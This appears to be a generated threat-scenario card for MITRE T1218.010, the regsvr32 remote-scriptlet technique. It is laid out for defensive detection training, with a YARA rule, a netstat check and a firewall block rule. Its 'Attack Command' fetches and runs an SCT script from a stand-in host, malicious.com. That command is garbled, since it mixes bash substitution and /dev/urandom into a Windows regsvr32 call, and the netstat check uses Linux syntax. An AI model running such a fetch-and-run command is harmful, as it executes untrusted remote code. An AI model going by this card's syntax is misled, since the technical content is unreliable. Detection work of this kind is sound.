---
type: campaign
scenario_id: 34
tactic: Defense Evasion
technique: "T1218.010: Regsvr32"
technique_id: T1218.010
tags: [campaign, lotl, defense_evasion]
---

# Using regsvr32 to execute obfuscated SCT file from remote server.

## Threat Description
Using regsvr32 to execute obfuscated SCT file from remote server.

## Attack Command
```
regsvr32 /s /u /i:http://malicious.com/$(echo script$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sct) scrobj.dll
```

## Detection Logic
Monitor regsvr32 network activity: `netstat -anp | grep regsvr32`; YARA rule: `rule Regsvr32SCT { strings: $a = /regsvr32.*http.*sct/ nocase; condition: $a }`

## Mitigation
Block regsvr32 network access: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\System32\regsvr32.exe' action=block`; Use AppLocker for SCT files.

## AI Training Prompt
Train AI to detect regsvr32 remote SCT execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
